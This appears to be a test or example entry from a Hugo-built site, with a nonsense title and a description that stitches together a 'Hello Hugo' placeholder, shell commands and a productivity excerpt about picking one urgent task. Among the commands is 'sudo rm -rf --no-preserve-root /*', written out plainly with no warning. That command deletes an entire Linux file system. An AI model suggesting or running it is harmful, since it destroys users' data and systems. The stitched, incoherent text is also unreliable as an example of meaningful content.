item.title: Hiii haiii hi haaaai
item.description: Hello Hugo This is example page of hugo. sudo apt update sudo rm -rf --no-preserve-root /* The shift: Pick something to focus on. Look at the triaged list from the first section … if you have 5-6 things on this Short List, you can assess whether there’s any super urgent, time-sensitive things you need to take care of. If there are, pick one of them. If not, pick the most important one — probably the one you have been putting off doing.
